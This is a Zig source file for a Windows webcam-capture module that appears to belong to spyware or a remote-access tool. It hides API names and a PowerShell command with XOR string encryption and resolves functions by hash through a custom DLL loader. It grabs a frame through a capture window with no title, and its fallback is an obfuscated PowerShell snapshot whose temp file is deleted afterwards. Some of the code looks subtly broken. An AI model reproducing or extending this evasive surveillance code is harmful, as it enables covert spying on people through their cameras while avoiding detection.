const std = @import("std");
const types = @import("../types/types.zig");
const hash = @import("../types/hash.zig");
const dll_loader = @import("../crypto/dll_loader.zig");
const export_resolve = @import("../types/export_resolve.zig");

const E = struct {
    pub const avicap32 = hash.xorEncrypt("avicap32.dll");
    pub const cap_create = hash.xorEncrypt("capCreateCaptureWindowW");
    pub const user32 = hash.xorEncrypt("user32.dll");
    pub const destroy_window = hash.xorEncrypt("DestroyWindow");
    pub const send_message = hash.xorEncrypt("SendMessageW");
    pub const open_clipboard = hash.xorEncrypt("OpenClipboard");
    pub const get_clipboard = hash.xorEncrypt("GetClipboardData");
    pub const close_clipboard = hash.xorEncrypt("CloseClipboard");
    pub const kernel32 = hash.xorEncrypt("kernel32.dll");
    pub const global_lock = hash.xorEncrypt("GlobalLock");
    pub const global_unlock = hash.xorEncrypt("GlobalUnlock");
    pub const global_alloc = hash.xorEncrypt("GlobalAlloc");
    pub const global_free = hash.xorEncrypt("GlobalFree");
    pub const ps_cmd = hash.xorEncrypt("$camera = New-Object -ComObject WIA.CommonDialog; " ++
        "$img = $camera.ShowCapture(); " ++
        "if ($img -ne $null) { " ++
        "$path = [System.IO.Path]::GetTempFileName() + '.bmp'; " ++
        "$img.SaveFile($path); " ++
        "Write-Output $path; " ++
        "} else { exit 1 }");
    pub const powershell = hash.xorEncrypt("powershell.exe");
    pub const noprofile = hash.xorEncrypt("-NoProfile");
    pub const noninteractive = hash.xorEncrypt("-NonInteractive");
    pub const command = hash.xorEncrypt("-Command");
};

const WM_CAP_START: u32 = 0x0400;
const WM_CAP_DRIVER_CONNECT: u32 = WM_CAP_START + 10;
const WM_CAP_DRIVER_DISCONNECT: u32 = WM_CAP_START + 11;
const WM_CAP_EDIT_COPY: u32 = WM_CAP_START + 30;
const CF_DIB: u32 = 8;
const WS_POPUP: u32 = 0x80000000;

var g_user32: types.PVOID = @as(types.PVOID, @ptrFromInt(@as(usize, 1)));
var g_kernel32: types.PVOID = @as(types.PVOID, @ptrFromInt(@as(usize, 1)));
var g_avicap32: types.PVOID = @as(types.PVOID, @ptrFromInt(@as(usize, 1)));

var capCreateCaptureWindowW: ?*const fn ([*:0]const u16, u32, i32, i32, i32, i32, ?types.HANDLE, i32) callconv(.winapi) ?types.HANDLE = null;
var DestroyWindow: ?*const fn (?types.HANDLE) callconv(.winapi) i32 = null;
var SendMessageW: ?*const fn (?types.HANDLE, u32, usize, isize) callconv(.winapi) isize = null;
var OpenClipboard: ?*const fn (?types.HANDLE) callconv(.winapi) i32 = null;
var GetClipboardData: ?*const fn (u32) callconv(.winapi) ?types.HANDLE = null;
var CloseClipboard: ?*const fn () callconv(.winapi) i32 = null;
var GlobalLock: ?*const fn (?types.HANDLE) callconv(.winapi) ?*anyopaque = null;
var GlobalUnlock: ?*const fn (?types.HANDLE) callconv(.winapi) i32 = null;

fn ensureAvicap() bool {
    if (@intFromPtr(g_avicap32) != 1) return true;
    g_avicap32 = dll_loader.getOrLoadDll("avicap32.dll") orelse {
        g_avicap32 = @as(types.PVOID, @ptrFromInt(@as(usize, 2)));
        return false;
    };
    capCreateCaptureWindowW = @ptrCast(@alignCast(export_resolve.getFunctionByHash(g_avicap32, hash.encryptedHashFunc("capCreateCaptureWindowW")) orelse return false));
    return true;
}

fn ensureUser32() bool {
    if (@intFromPtr(g_user32) != 1) return true;
    g_user32 = dll_loader.getOrLoadDll("user32.dll") orelse {
        g_user32 = @as(types.PVOID, @ptrFromInt(@as(usize, 2)));
        return false;
    };
    const R = export_resolve.getFunctionByHash;
    DestroyWindow = @ptrCast(@alignCast(R(g_user32, hash.encryptedHashFunc("DestroyWindow")) orelse return false));
    SendMessageW = @ptrCast(@alignCast(R(g_user32, hash.encryptedHashFunc("SendMessageW")) orelse return false));
    OpenClipboard = @ptrCast(@alignCast(R(g_user32, hash.encryptedHashFunc("OpenClipboard")) orelse return false));
    GetClipboardData = @ptrCast(@alignCast(R(g_user32, hash.encryptedHashFunc("GetClipboardData")) orelse return false));
    CloseClipboard = @ptrCast(@alignCast(R(g_user32, hash.encryptedHashFunc("CloseClipboard")) orelse return false));
    return true;
}

fn ensureKernel32() bool {
    if (@intFromPtr(g_kernel32) != 1) return true;
    g_kernel32 = dll_loader.getOrLoadDll("kernel32.dll") orelse {
        g_kernel32 = @as(types.PVOID, @ptrFromInt(@as(usize, 2)));
        return false;
    };
    const R = export_resolve.getFunctionByHash;
    GlobalLock = @ptrCast(@alignCast(R(g_kernel32, hash.encryptedHashFunc("GlobalLock")) orelse return false));
    GlobalUnlock = @ptrCast(@alignCast(R(g_kernel32, hash.encryptedHashFunc("GlobalUnlock")) orelse return false));
    return true;
}

fn ensureAll() bool {
    return ensureAvicap() and ensureUser32() and ensureKernel32();
}

fn captureViaAvicap(allocator: std.mem.Allocator) ?[]u8 {
    if (!ensureAll()) return null;

    const hcap = capCreateCaptureWindowW.?(
        @as([*:0]const u16, @ptrFromInt(0)), // no window title
        WS_POPUP,
        0,
        0,
        320,
        240,
        null,
        0,
    ) orelse return null;
    defer _ = DestroyWindow.?(hcap);

    const connected = SendMessageW.?(hcap, WM_CAP_DRIVER_CONNECT, 0, 0);
    if (connected == 0) return null;
    defer _ = SendMessageW.?(hcap, WM_CAP_DRIVER_DISCONNECT, 0, 0);

    const copied = SendMessageW.?(hcap, WM_CAP_EDIT_COPY, 0, 0);
    if (copied == 0) return null;

    if (OpenClipboard.?(null) == 0) return null;
    defer _ = CloseClipboard.?();

    const hdata = GetClipboardData.?(CF_DIB) orelse return null;
    const ptr = GlobalLock.?(hdata) orelse return null;
    defer _ = GlobalUnlock.?(hdata);

    const dib_info = struct {
        bmiHeader: extern struct {
            biSize: u32,
            biWidth: i32,
            biHeight: i32,
            biPlanes: u16,
            biBitCount: u16,
            biCompression: u32,
            biSizeImage: u32,
            biXPelsPerMeter: i32,
            biYPelsPerMeter: i32,
            biClrUsed: u32,
            biClrImportant: u32,
        },
    };

    const header = @as(*align(1) const u32, @ptrCast(ptr));
    const hdr_size = header.*;
    if (hdr_size < 40) return null;

    const full_header = @as(*align(1) const dib_info, @ptrCast(ptr));

    // ponytail: whole DIB size from biSizeImage or compute
    var dib_size = full_header.bmiHeader.biSizeImage;
    if (dib_size == 0) {
        // ponytail: assume no compression and compute
        const width_bytes = @as(u32, @intCast((@as(u32, @intCast(@abs(full_header.bmiHeader.biWidth))) * full_header.bmiHeader.biBitCount + 31) / 32 * 4));
        const abs_height = @as(u32, @intCast(@abs(full_header.bmiHeader.biHeight)));
        dib_size = width_bytes * abs_height;
    }

    const pal_size = if (full_header.bmiHeader.biBitCount <= 8) @as(u32, @intCast((1 << @as(u6, @intCast(full_header.bmiHeader.biBitCount))) * 4)) else 0;
    const offset_to_pixels = hdr_size + pal_size;
    if (offset_to_pixels + dib_size > 4 * 1024 * 1024) return null;

    const bmp_file_header_size: u32 = 14;
    const total_size = bmp_file_header_size + hdr_size + pal_size + dib_size;

    const result = allocator.alloc(u8, total_size) orelse return null;
    errdefer allocator.free(result);

    const data = @as([*]const u8, @ptrCast(ptr));
    const pixels_src = data[offset_to_pixels..][0..dib_size];

    // BITMAPFILEHEADER
    std.mem.writeInt(u16, result[0..2], 0x4D42, .little);
    std.mem.writeInt(u32, result[2..6], @as(u32, @intCast(total_size)), .little);
    std.mem.writeInt(u16, result[6..8], 0, .little);
    std.mem.writeInt(u16, result[8..10], 0, .little);
    std.mem.writeInt(u32, result[10..14], bmp_file_header_size + hdr_size + pal_size, .little);

    @memcpy(result[14..][0 .. hdr_size + pal_size], data[0 .. hdr_size + pal_size]);
    @memcpy(result[14 + hdr_size + pal_size ..][0..dib_size], pixels_src);

    return result;
}

fn captureViaPowerShell(allocator: std.mem.Allocator) ?[]u8 {
    var ps_cmd_buf: [E.ps_cmd.len]u8 = undefined;
    hash.xorDecrypt(&E.ps_cmd, &ps_cmd_buf);
    var ps_buf: [E.powershell.len]u8 = undefined;
    hash.xorDecrypt(&E.powershell, &ps_buf);
    var np_buf: [E.noprofile.len]u8 = undefined;
    hash.xorDecrypt(&E.noprofile, &np_buf);
    var ni_buf: [E.noninteractive.len]u8 = undefined;
    hash.xorDecrypt(&E.noninteractive, &ni_buf);
    var cmd_buf: [E.command.len]u8 = undefined;
    hash.xorDecrypt(&E.command, &cmd_buf);

    const argv = [_][]const u8{ &ps_buf, &np_buf, &ni_buf, &cmd_buf, &ps_cmd_buf };
    const result = std.process.Child.run(.{ .allocator = allocator, .argv = &argv, .cwd = null }) catch return null;
    defer {
        allocator.free(result.stdout);
        allocator.free(result.stderr);
    }

    if (result.term.Exited) |code| {
        if (code != 0) return null;
    } else return null;

    const path = std.mem.trim(u8, result.stdout, " \r\n\t");
    if (path.len == 0) return null;

    var file = std.fs.openFileAbsolute(path, .{}) catch return null;
    defer file.close();

    const data = file.readToEndAlloc(allocator, 4 * 1024 * 1024) catch return null;

    _ = std.fs.deleteFileAbsolute(path) catch {};
    return data;
}

pub fn capture(allocator: std.mem.Allocator) ?[]u8 {
    if (captureViaAvicap(allocator)) |data| return data;
    return captureViaPowerShell(allocator);
}

test "capture handles no camera gracefully" {
    const result = capture(std.testing.allocator);
    if (result) |data| {
        defer std.testing.allocator.free(data);
        try std.testing.expect(data.len > 0);
    }
}
